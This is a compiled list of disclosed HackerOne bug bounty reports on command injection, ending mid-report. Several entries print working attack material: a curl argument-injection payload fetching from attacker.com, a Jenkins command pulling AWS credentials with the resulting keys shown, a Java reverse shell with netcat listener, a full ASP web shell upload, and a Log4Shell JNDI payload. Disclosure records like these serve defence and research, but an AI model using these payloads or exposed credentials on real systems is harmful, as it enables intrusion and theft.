# Command Injection - Generic

_101 reports — High/Critical, disclosed_

### [Argument Injection via curl Short-Flag Grouping](https://hackerone.com/reports/3669305)

- **Report ID:** `3669305`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** curl
- **Reporter:** @midoussa7
- **Bounty:** - usd
- **Disclosed:** 2026-04-13T07:10:29.935Z
- **CVE(s):** -

**Vulnerability Information:**

This report details how the curl -os command facilitates an Argument Injection vulnerability in applications that wrap the curl command-line tool.
The specific command curl -os /etc/passwd --url http://example.com demonstrates a subtle but dangerous behavior. Because -s (silent) follows -o (output), curl expects the very next string to be the filename.In this scenario:The -o flag consumes the next argument (/etc/passwd).The -s flag tells curl to suppress the progress meter and error messages.The --url flag specifies the source of the data.This effectively turns a "downloader" into a "file overwriter."
 Root Cause Analysis
The root cause is insufficient input validation and the unsafe use of command-line wrappers.Flag Grouping: Like most Unix-style utilities, curl allows "short-flag grouping." When a user inputs -os, curl interprets this as two separate flags: -o (output to a file) and -s (silent mode).Missing Delimiters: If an application executes a command like curl $USER_INPUT, it assumes the input will be a URL. However, if the input starts with a dash (-), curl treats it as a command-line argument rather than a string.Shell Interpretation: Many developers use functions like os.system() or exec() which pass a raw string to the system shell, allowing the shell to parse the attacker's injected flags as if they were part of the original command structure.
4. Proof of Concept (PoC)Scenario:
 A web application allows a user to "check if a URL is alive" by running a backend command: curl [USER_URL].

5.Steps to Reproduce:

Attacker Input: 
1-Instead of a URL,
 the attacker enters: -os /var/www/html/shell.php --url http://attacker.com 
2- Backend Execution:
 The server executes the concatenated string:curl -os /var/www/html/shell.php --url http://attacker.com Result: curl silently downloads the malicious_script.txt and saves it as shell.php in the web 
3-rootExploitation: 
The attacker navigates to http://victim.com to execute their code.

## Impact

## Summary:
The impact of this vulnerability is typically categorized as High to Critical, depending on the environment:Arbitrary File Write: An attacker can use the -o (or --output) flag to write the contents of a URL to any location the application has permission to access.System Defacement/DDoS: By overwriting .html or .js files, an attacker can deface a website.Remote Code Execution (RCE): By overwriting a .sh script, a crontab, or a .php file in a web directory, an attacker can execute arbitrary code on the server.Data Exfiltration: Using the -F (form) or -d (data) flags, an attacker could redirect sensitive local files to their own remote server
5. Remediation 
RecommendationsPrimary Fix: Use a library (e.g., libcurl for C, requests for Python) instead of calling the system's curl binary.Argument Separation: If the CLI must be used, use the -- separator to tell curl that all following strings are URLs and not flags:Safe: curl -- [USER_INPUT]Sanitization: Disallow any input that begins with a hyphen (-) or contains shell metacharacters (;, &, |).Would you like a Python or Node.js code example showing the "safe" vs. "unsafe" way to handle these commands?

---

### [Middleware Authentication Bypass on IBM Portal](https://hackerone.com/reports/3088290)

- **Report ID:** `3088290`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** IBM
- **Reporter:** @muhammadwaseem3
- **Bounty:** - usd
- **Disclosed:** 2025-05-02T14:58:27.989Z
- **CVE(s):** CVE-2025-29927

**Summary (team):**

Middleware authentication bypass on IBM portal endpoint  was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @muhammadwaseem3.

---

### [CVE-2023-41763 Business Elevation of Privilege vulnerability on [.mtn.com]](https://hackerone.com/reports/2309291)

- **Report ID:** `2309291`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** MTN Group
- **Reporter:** @h0w
- **Bounty:** - usd
- **Disclosed:** 2025-02-22T15:49:20.268Z
- **CVE(s):** CVE-2023-41763, CVE-2023-36780, CVE-2023-36786, CVE-2023-36789

**Vulnerability Information:**

## Summary:
The Microsoft Skype for Business installation on the remote host is missing security updates. the flaw was actively exploited. Attackers could access some sensitive information but not alter or restrict access to it. The impact relates primarily to confidentiality. It is, therefore, affected by multiple vulnerabilities:
 - An elevation of privilege vulnerability. An attacker can exploit this to gain elevated privileges.
(CVE-2023-41763)
 - A remote code execution vulnerability. An attacker can exploit this to bypass authentication and execute unauthorized arbitrary commands. (CVE-2023-36780, CVE-2023-36786, CVE-2023-36789)


## Steps To Reproduce:
  1. Navigate visit  https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx
  1. Intercept request to burp-suite and send to repeater
  1. Added `parameter-vulnerable` is `lwa/Webpages/LwaClient.aspx?meeturl=` I found this use recon
  1. Used `base64` encode to add  payloads `template-injection`  `LMN%{1337*1337}#.xx`
```
http://attacker-payload-interact.sh/?id=LMN%{1337*1337}#.xx//
```
  1. Sent request again, and boom **This server has vulnerable:**

Here's the HTTP Parameter request that the issue:
```
GET /lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8= HTTP/1.1
Host: fec-feweb-ext.mtn.com
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
``` 
```
HTTP/1.1 200 OK
Cache-Control: private
```

## Supporting Material/References:
Microsoft has released KB5032429 to address this issue.


{F2970073}

{F2970077}

## Impact

The Elevation of Privilege vulnerability, CVE-2023-41763, posed a significant security risk because it allowed attackers to potentially breach internet perimeters by exploiting Skype for Business. While the vulnerability primarily affected confidentiality, it could have led to the exposure of sensitive information that in turn might provide access to internal networks.

---

### [Cisco IOS XE instance at ████ vulnerable to CVE-██████](https://hackerone.com/reports/2778350)

- **Report ID:** `2778350`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** MTN Group
- **Reporter:** @odaysec
- **Bounty:** - usd
- **Disclosed:** 2025-02-19T06:23:28.648Z
- **CVE(s):** CVE-2023-20198, CVE-2023-20273

**Vulnerability Information:**

## Summary:
CVE-███████ is characterized by improper path validation to bypass Nginx filtering to reach the webui_wsma_http web endpoint without requiring authentication. By bypassing authentication to the endpoint, an attacker can execute arbitrary Cisco IOS commands or issue configuration changes with Privilege 15 privileges. Further attacks involved exploitation of CVE-2023-20273 to escalate to the underlying Linux OS root user to facilitate implantation.

This PoC exploits CVE-█████████ to leverage two different XML SOAP endpoints:
The vulnerability check, config, and command execution options all target the `cisco:wsma-exec` SOAP endpoint to insert commands into the `execCLI` element tag.
The add user option targets the `cisco:wsma-config` SOAP endpoint to issue a configuration change and add the Privilege 15 account. This endpoint could be [ab]used to make other configuration changes, but thats outside the scope of this PoC.

## Proof On Concepts :
See below for an example request that bypasses authentication on vulnerable instances of IOS-XE. This POC creates a user named baduser with privilege level 15. Let’s dig into the details.
{F3672631}

  1. Sign in as any user ███ query
  1. Visit Searchbar and Search Query ██████████: "MTN Innovation Centre"`
  1. Found domain owned by MTN Cameroon as `███`
  1. Intercept url to burp-suite and sent to repeater
  1. Sent to intruder and Set up the [exploits here](█████████)
  1. Run exploits bellow command 

```bash
exploit.py -t ████ -c

Testing for vulnerability
Target IP:      █████
Target URL:     █████████
Vulnerable:     True
IOS Ver:        ISR4331/K9 europ-constantia-2 IOS 16.6 Cisco IOS Software [Everest], ISR Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 16.6.4, RELEASE SOFTWARE (fc3)

Done.
```
```bash
exploit.py -t █████ -g

Selected Target:        ██████
Running in Exec Mode
Executing Command:      sh run

Sending exploit to target URL:  █████

Building configuration...
Current configuration : 17326 bytes
```
```bash
enable secret 5 $1$vF3Q$wplcifyib3DUyzbgcUGe/1
enable password 7 1214041E1E
snmp-server trap-source GigabitEthernet0/0/0.3029
snmp-server source-interface informs GigabitEthernet0/0/0.3029
snmp-server contact ████ ██████
```
and you can see all the sensitive for configuration was exposed

{F3672637}

{F3672640}

{F3672642}


## Supporting Material/References:
  * [Cisco Advisory](███████)
  * [horizon3ai CVE-██████ research](██████████)
  * [horizon3ai CVE-██████ PoC](██████)
  * [LeakIX CVE-2023-20273 PoC](██████████)

## Impact

Cisco is providing an update for the ongoing investigation into observed exploitation of the web UI feature in Cisco IOS XE Software. We are updating the list of fixed releases and adding the Software Checker. Our investigation has determined that the actors exploited two previously unknown issues. The attacker first exploited CVE-█████ to gain initial access and issued a privilege 15 command to create a local user and password combination. This allowed the user to log in with normal user access. The attacker then exploited another component of the web UI feature, leveraging the new local user to elevate privilege to root and write the implant to the file system.

---

### [ Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/](https://hackerone.com/reports/2083771)

- **Report ID:** `2083771`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @shuvam321
- **Bounty:** - usd
- **Disclosed:** 2024-12-18T19:53:05.209Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The host https://██████/ has /jenkins/script directory enabled that allows user to execute system command in the host.


## References
https://hackerone.com/reports/768266

## Impact

Attacker can use the IAM credentials to manage various AWS resources, create and delete resources, read and write data in AWS services,  create and manage other IAM users and roles, access the AWS Management Console, use the AWS Command Line Interface (CLI). In addition, attacker can obtain a reverse shell and takeover the vulnerable server.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to https://███/jenkins/script and enter the following command and click on run. 

println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text

```
{
  "Code" : "Success",
  "LastUpdated" : "2023-07-25T15:06:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAVAYADSOPOZ46OKUF",
  "SecretAccessKey" : "zktjDluq7fiPeRPZ/Ptdj0f/RpifcpiverrHZPY9",
  "Token" : "FwoDYXdzEC4aDOSTrvC1+12bsyz/YCLpBJSWuycc/qloo+gbOS0H0HDHj+qAV6rldadbawPMkpUC2kyF9UW3rayH29j3MQNMDDxoPZTpnWLYuIbBl1iaYciwrOVemd6OTSDTyoAz9JjO1Cc3svhv58rhTx1c+FWpQKxtOgiLPEJWT/sPfdEJDAcLoXfyDi7lLWD5ydyHuKWngG8ZBG/5Ik170XOpYeZpSpJ/pspBNnzbf5dPJo/QVNWN+hoY8+WrK4Hko7y04Z/ZwJWO3Q6DYVM2OSARheKUnih8NrX6pROliySxRzj3fedhz2h95axbt+up+HwvszZv+ksQmZdAOFL4iI8oXWF6RgWz7Mkyot+o+Zk4fKRBZOad0iDg0NjaNvZSOWHCx+Bd55lq/rMmthcYubHgGtLXS8F9cJShYjysU9pDK9M7Hd644KmSVgvRe0pCV4GgwOAqKdSYVQn7A2cBeO4ROL712adCz8wzYDMRavHK8mfeKCd5qAfrd7z7BGIiaIeEYJ52CglOpUFywMnlmPNN1V/Rvih1YX0Ndq0yNso9Rj1FUtiLTWysCkm/YGCK68TILlEX7UaJV3keGpMkpCULsGkcH23RZmp8NjYoIf7okJ28ygVW4GYWF48MWVm96HWDRGJ951x3IOIZBdOhgKrVRQJLUXgVjDwm1QroAyYTRSiLw9YrR5jmN6ONfYnyh06qpl1PUz8C1+iXtRQIjzWjaaHLh2YQERTIo/ejCERtoM/AEjhB6DhdlroSvuPNjD03NPYtxd87vUuG7gsZSYqXOOsU3sYiJra3UrbA9vFR/BmnJcXbxcsWMtCCs9syRp9r+2V3qT6ppN2i5Im9KI/K/6UGMkHbC2LUgZo1VIbWCrN+ePxqijy1CUe9r98gOm9Z2rxKQ+CfKjPJo0nvYc3Z8UmxqKpeG2dtOpW8OYuQZivCMR5ifg==",
  "Expiration" : "2023-07-25T21:32:22Z"
}
```

2. IAM Credentials will be disclosed.

3. To get a reverse shell use this command.

## In vulnerable host

```
String host="your_server_ip";
int port=1337;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## In your host 
```
nc -nvlp 1337
```

4. You will receive a reverse shell as user jenkins.


██████

## Suggested Mitigation/Remediation Actions
Restrict access to /jenkins/script directory.

---

### [Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via RCE in ghe-update-check](https://hackerone.com/reports/2325023)

- **Report ID:** `2325023`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-17T19:02:23.676Z
- **CVE(s):** CVE-2024-1359

**Summary (team):**

A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance when setting up an HTTP proxy. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15.

[CVE-2024-1359](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1359)

---

### [Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via RCE in collectd](https://hackerone.com/reports/2329547)

- **Report ID:** `2329547`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-17T18:56:32.068Z
- **CVE(s):** CVE-2024-1369

**Summary (team):**

A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance when setting the username and password for collectd configurations. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15.

[CVE-2024-1369](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1369)

---

### [Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via RCE in actions-console](https://hackerone.com/reports/2323292)

- **Report ID:** `2323292`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-17T18:54:21.823Z
- **CVE(s):** CVE-2024-1355

**Summary (team):**

A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via the actions-console docker container while setting a service URL. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15.

[CVE-2024-1355](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1355)

---

### [Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward](https://hackerone.com/reports/2332623)

- **Report ID:** `2332623`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-13T17:44:35.244Z
- **CVE(s):** CVE-2024-1374

**Summary (team):**

A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15. This vulnerability was reported via the GitHub Bug Bounty program.

---

### [Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection](https://hackerone.com/reports/2332551)

- **Report ID:** `2332551`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-13T17:43:27.774Z
- **CVE(s):** CVE-2024-1378

**Summary (team):**

A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring SMTP options. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15. This vulnerability was reported via the GitHub Bug Bounty program.

---

### [Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via RCE in syslog-ng](https://hackerone.com/reports/2329466)

- **Report ID:** `2329466`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitHub
- **Reporter:** @inspector-ambitious
- **Bounty:** - usd
- **Disclosed:** 2024-09-13T17:42:46.672Z
- **CVE(s):** CVE-2024-1354

**Summary (team):**

A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via the syslog-ng configuration file. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15. This vulnerability was reported via the GitHub Bug Bounty program.

---

### [Shell command injection in https://partner.steamgames.com/apps/communityitems/ via file extension of item_image_small and item_image_large](https://hackerone.com/reports/840243)

- **Report ID:** `840243`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T23:30:13.899Z
- **CVE(s):** -

**Summary (team):**

Shell injection was achieved on a publishing gateway through metacharacter injection in an item-upload path.

**Summary (researcher):**

.

---

### [WG call injection in /economy/contextcommand](https://hackerone.com/reports/652649)

- **Report ID:** `652649`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T22:57:19.732Z
- **CVE(s):** -

**Summary (team):**

Context-specific commands to a web-facing gateway had insufficient parameter validation. Some economy queries could be run outside the actual requesters' capability by confusing the type system. Some bypasses for initial fixes were also provided.

**Summary (researcher):**

Insufficient validation of parameters allowed making arbitrary calls to an internal data service.

---

### [RCE on partner.steampowered.com](https://hackerone.com/reports/518348)

- **Report ID:** `518348`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T22:36:37.903Z
- **CVE(s):** -

**Summary (team):**

Insufficient validation of parameters allowed an attacker to specify the name of a PHP function to call with parameter types (array, array, string). This could be changed to a call with parameter types (string string) using array_diff_uassoc. This enabled calling assert, which at the time invoked eval, enabling arbitrary code execution.

**Summary (researcher):**

-

---

### [Bypass incomplete fix of CVE-2024-27980](https://hackerone.com/reports/2461831)

- **Report ID:** `2461831`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js
- **Reporter:** @tianst
- **Bounty:** - usd
- **Disclosed:** 2024-07-09T05:57:52.160Z
- **CVE(s):** CVE-2024-36138

**Summary (team):**

The CVE-2024-27980 was identified as an incomplete fix for the BatBadBut vulnerability. This vulnerability arises from improper handling of batch files with all possible extensions on Windows via `child_process.spawn` / `child_process.spawnSync`. A malicious command line argument can inject arbitrary commands and achieve code execution even if the shell option is not enabled.

This vulnerability affects all users of `child_process.spawn` and `child_process.spawnSync` on Windows in all active release lines.

---

### [RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/](https://hackerone.com/reports/2054184)

- **Report ID:** `2054184`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @pizzapower
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:40:19.710Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.  There may be more, I had to fuzz a lot to find these. 

These repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions. 

Running the `dir` command at the uploaded file `https://████████/savefiles/poc.asp?cmd=dir`  - the shell has been deleted for security purposes. Let me know if you want me to reupload it. 

██████████

The request from burp - note the null byte: 

█████



*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████████/savefiles/poc.asp` and run commands. 


## Impact

Everything could be compromised.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Here is the actual request, but I'm not sure how well the null byte will translate. 

```
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1
Host: ███
Cookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC
Content-Length: 1306
Sec-Ch-Ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://███████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary7RcvHwqSCmAtKCIB
Content-Disposition: form-data; name="myfile"; filename="poc.asp.png"


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>



------WebKitFormBoundary7RcvHwqSCmAtKCIB--

```

*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████/savefiles/poc.asp` and run commands.

## Suggested Mitigation/Remediation Actions

---

### [RCE of Burp  Scanner / Crawler via Clickjacking ](https://hackerone.com/reports/1274695)

- **Report ID:** `1274695`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** PortSwigger Web Security
- **Reporter:** @mattaustin
- **Bounty:** 3000 usd
- **Disclosed:** 2023-10-10T08:24:46.196Z
- **CVE(s):** -

**Vulnerability Information:**

Burp Suite utilizes an embedded Chrome browser for crawling and scanning web applications. The Chrome instance is launched in headless mode, with remote debugging enabled via the remote-debugging websocket port instead of remote-debugging-pipe. As a result, a known XSS vulnerability in Chrome can be leveraged in combination with a JavaScript port sniffing and ClickJacking attack to compromise the WebSocket GUID for the remote debugging channel. Using the provided remote debugging APIs, it’s possible to trigger a file download to the `/Applications/Burp Suite Professional.app/Contents/` directory with a new `user.vmoptions` file. This will provide the `-Xmx5m` and `-XX:OnOutOfMemoryError=open -a Calculator` flags to JVM the next time that Burp Suite is launched. Accordingly, Burp Suite will quickly exhaust the available JVM memory and trigger the supplied OS command.

Based on Google’s security impact guidelines, this issue would typically be considered to have no security impact since Chrome requires additional flags to run (`--remote-debugging` and `--headless`) [1]. Additionally, the XSS vector used in this PoC has been public to Chrome since at least 2016 and reported in multiple tickets [2-6]. As a result, we are reporting this as a Burp Suite vulnerability since the named pipe transport could be utilized to mitigate this issue, which is supported by tools like puppeteer (e.g. `--remote-debugging-pipe`) [7]. 

### POC: 
See attached video. 

### Steps to reproduce:

To confirm this issue, perform the following steps:

1. Download the attached ‘burp.html’ exploit, and host it on a web server (e.g. `python -m http.server`)
2. Launch an instance of Burp Suite, and start a new scan of the web server.
3. Open a Chrome browser and navigate to the hosted exploit page (e.g. http://127.0.0.1:8000/burp.html)
4. Observe that a JavaScript port scanner is determining the randomized port listening for Chrome remote debugging. After the port is identified, a clickjacking payload will be rendered on the page. 
5. After clicking the ‘CLICK ME!!!’ button, restart Burp Suite and observe that the Calculator app has been launched. 

### References:
[1] https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/security-labels.md#TOC-Security_Impact-None
[2] https://bugs.chromium.org/p/chromium/issues/detail?id=607939
[3] https://bugs.chromium.org/p/chromium/issues/detail?id=618333
[4] https://bugs.chromium.org/p/chromium/issues/detail?id=619414
[5] https://bugs.chromium.org/p/chromium/issues/detail?id=775527
[6] https://bugs.chromium.org/p/chromium/issues/detail?id=798163
[7] https://github.com/puppeteer/puppeteer/blob/943477cc1eb4b129870142873b3554737d5ef252/src/node/PipeTransport.ts

## Impact

After successful exploitation an attacker can gain control over victim's computer with the same permissions as the user running the scanner.

---

### [PHP Object injection -> Building Custom Gadget chain -> RCE ](https://hackerone.com/reports/1820492)

- **Report ID:** `1820492`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** ExpressionEngine
- **Reporter:** @karezma
- **Bounty:** - usd
- **Disclosed:** 2023-03-28T21:32:43.206Z
- **CVE(s):** -

**Summary (team):**

When signed into the control panel with permissions, this researcher was able to build a custom Gadget chain, which led to remote code execution.

---

### [Rocket.Chat Server RCE](https://hackerone.com/reports/1631258)

- **Report ID:** `1631258`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Rocket.Chat
- **Reporter:** @yuske
- **Bounty:** - usd
- **Disclosed:** 2023-03-04T17:53:14.293Z
- **CVE(s):** CVE-2023-23917

**Summary (team):**

Rocket.Chat server (https://github.com/RocketChat/Rocket.Chat) has a Prototype Pollution vulnerability that leads to RCE under the admin account. Any user can create their own server in your cloud and become an admin so this vulnerability could affect the cloud infrastructure. This attack vector also may increase the impact of XSS to RCE which is dangerous for self-hosted users as well.

---

### [LFI at http://www.████](https://hackerone.com/reports/986380)

- **Report ID:** `986380`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Sony
- **Reporter:** @n0x496n
- **Bounty:** - usd
- **Disclosed:** 2022-12-16T19:02:51.787Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that a Sony endpoint was vulnerable to a Local File Inclusion (LFI) vulnerability via a URL parameter. The researcher was able to leverage this vulnerability to read the contents of sensitive system files such as /etc/passwd and /proc/version.

---

### [LOGJ4 VUlnerability [HtUS]](https://hackerone.com/reports/1624137)

- **Report ID:** `1624137`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ferreiraklet_
- **Bounty:** 1000 usd
- **Disclosed:** 2022-11-18T18:07:05.183Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

**Description:**
Hi team,

log4 shell is recent 0-day exploit it's Java package vulnerable. █████ is vulnerable

**Impact**

RCE

**System Host(s)**

██████

**Affected Product(s) and Version(s)**

**CVE Numbers**

CVE-2021-44228

**Steps to Reproduce**

1. Go to this url => https://█████/?x=${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}
2. paste the poc code on parameter
3. Then burp collaborator received reverse ping back
Photos below

**POC CODE**
${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}

**Suggested Mitigation/Remediation Actions**
https://www.lunasec.io/docs/blog/log4j-zero-day/

## Impact

Successful attack leads Arbitary Code Execution on the application

---

### [Apache Flink RCE via GET jar/plan API Endpoint](https://hackerone.com/reports/1418891)

- **Report ID:** `1418891`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Aiven Ltd
- **Reporter:** @jarij
- **Bounty:** 6000 usd
- **Disclosed:** 2022-11-08T06:30:33.425Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Aiven has not restricted access to the GET `jars/{jar_id}/plan` API. This endpoint can be used to load java class files with the specified arguments that are in the java classpath on the server. This can be abused to gain RCE on the Apache Flink Server.

## Steps To Reproduce:

The video below shows how to setup the Apache Flink instance and run the PoC. Feel free to use my VPS which will make triaging somewhat easier (`ssh ████████`, password: `██████`):

█████████


  1. Login to my aiven account: `████`, password: `██████`
  1. Run the SQL job as demonstrated in the video
  1. Open the Flink Web UI and verify that there is a new job in the jobs panel.
  1. Setup netcat reverse shell listener on the VPS: `nc -n -lvp 8888`
  1. Update the poc.py variables to match your instance, if you are not using my Apache Flink instance
  1. Run the poc: `python3 poc.py`
  1. Reverse shell connection should pop up
 1. After connection has been closed, the Apache Flink will crash, so the Aiven service daemon will  have to restart it. Because of this, you have to run new SQL job after every time you run the poc script

# API Request

Here's the HTTP API request that exploits the issue:

```http
